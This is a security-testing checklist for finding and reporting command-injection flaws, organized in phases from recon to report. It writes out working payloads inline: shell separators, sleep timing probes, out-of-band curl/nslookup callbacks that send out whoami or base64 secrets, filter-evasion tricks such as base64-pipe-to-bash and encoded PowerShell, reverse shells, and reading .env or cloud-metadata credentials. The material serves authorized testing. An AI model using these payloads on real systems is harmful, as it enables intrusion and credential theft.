# Command-Injection Testing Checklist — tick per sink

> Companion to `COMMAND_INJECTION_TESTING_GUIDE.md`. The finding is **a command executing** (output / repeated delay /
> server-sourced OOB), not a reflected metacharacter. Work top-to-bottom **per command sink**; stop and report only
> when execution is proven.

## PHASE 0 — Recon & lab (§3/§1)
- [ ] Found every feature that shells out (ping/lookup/whois, convert/resize/transcode, tar/zip, git, backup, diagnostics).
- [ ] Checked filenames/headers/EXIF/metadata consumed by a shell-out; grepped source/JS for exec/system/spawn.
- [ ] **Second-order:** flagged stored values (hostname/path/name in profile/config) later consumed by a backend job/cron.
- [ ] Stood up an **OOB host** (interactsh) for blind detection + exfil.

## PHASE 1 — Baseline / classify (§4/§6.1)
- [ ] Injected benign markers; classified **in-band / time / OOB**; identified **OS/shell** (`&ver`/`&echo %OS%` vs `;uname`).
- [ ] Determined where input LANDS: full-command vs **argument-only** vs **quoted** (sent `'` and `"` separately to find the quote).
- [ ] Picked the matching **breakout** (unquoted `;id` / double `";id;"` / single `';id;'` / inside `` ` `` or `$()` / newline `%0a`).

## PHASE 2 — Detect (§5–§9)
- [ ] In-band: tried `;` `|` `||` `&` `&&` `` `id` `` `$(id)` newline → looked for `id`/marker output.
- [ ] **Windows:** tried `&`/`|`/`||` with `whoami`/`ver`/`echo %OS%` (Linux payloads silent ≠ safe — it may be Windows).
- [ ] Time-based: `;sleep 10` (Win `& ping -n 10 127.0.0.1`/`& timeout 10`) → **repeated** delay vs baseline (excluded jitter).
- [ ] OOB: `;nslookup x.oob` / `;curl http://oob` (Win `& nslookup %COMPUTERNAME%.oob`) → hit **from the server IP**.
- [ ] Boolean/response-diff blind (§7.1, when time noisy + OOB blocked): `;true` vs `;false` / valid-vs-invalid command / `[ … ] && <observable>` → stable success-vs-fail signal → read 1 char/req.
- [ ] Argument injection (if input is one arg): tried tool flags (`curl -o`, `tar --checkpoint-action=exec=`, `git ext::sh`).

## PHASE 3 — Evade WAF/filter (§10)
- [ ] Spaces blocked → `${IFS}` / `{cmd,arg}` / `<` (Linux); `%09`/`,`/`;` token-splitting (Windows).
- [ ] Keyword blocked → quoting/backslash (`c''at`, `w\ho\am\i`) / globbing (`/???/c?t`); Windows `^`/`""` (`w^h^o^a^m^i`, `who""ami`).
- [ ] Heavy filter → base64-decode-pipe (`echo <b64>|base64 -d|bash`); Windows `powershell -enc <base64-UTF16LE>`.
- [ ] Windows keyword rebuild → env-var substring (`%COMSPEC:~-7,3%`) / `FOR /F` loops / delayed expansion (`cmd /v:on`).
- [ ] Separator blocked → swap (`|`, `||`, `` ` ``, `$()`, `%0a`).

## PHASE 4 — Impact (§11–§14)
- [ ] **Shell (§11):** confirmed `id`/`whoami`; (authorized red-team) reverse shell to my listener.
- [ ] **Blind exfil (§12):** sent `$(whoami)`/`$(hostname)`/secret(base64) through DNS/HTTP OOB.
- [ ] **Pivot (§13, authorized):** read config/.env → creds (read-only); cloud metadata creds from the box.
- [ ] **Special sinks (§14):** ImageMagick MVG/SVG, ffmpeg playlist, Ghostscript, git/tar (+ FileUpload kit to land the file).
- [ ] **Cleaned up:** removed any written files; killed shells; no persistence.

## PHASE 5 — Validate → report
- [ ] Proved **execution** (output / repeated delay / server-sourced OOB carrying a marker) — FP check §16.
- [ ] Re-tested timing 2–3× to exclude jitter; tied the OOB hit to my specific payload + server IP.
- [ ] Used a **benign marker**; validated read secrets read-only; redacted.
- [ ] Confirmed on **production**; re-tested partial fixes (`;`→`|`/`$()`, space→`${IFS}`).
- [ ] Set CVSS 3.1 + **CWE-78** (or **CWE-88** for argument injection) (§17).
- [ ] De-duped to one finding per sink; led with the cleanest execution proof (§20).

## AUTO-REJECT (don't submit if…)
- [ ] A `;`/`|` merely **reflected** in the response (no command ran).
- [ ] A **single** slow response after `;sleep` (could be jitter — re-test).
- [ ] An "invalid host" error (validation, not execution).
- [ ] An OOB hit you can't tie to your payload + the **target** server IP.
- [ ] SSRF mislabeled (server fetched a URL, no command ran).
- [ ] "commix flagged it" with no manual reproduction.
- [ ] Self-DoS (`;sleep 999` / fork bomb) instead of a benign marker.
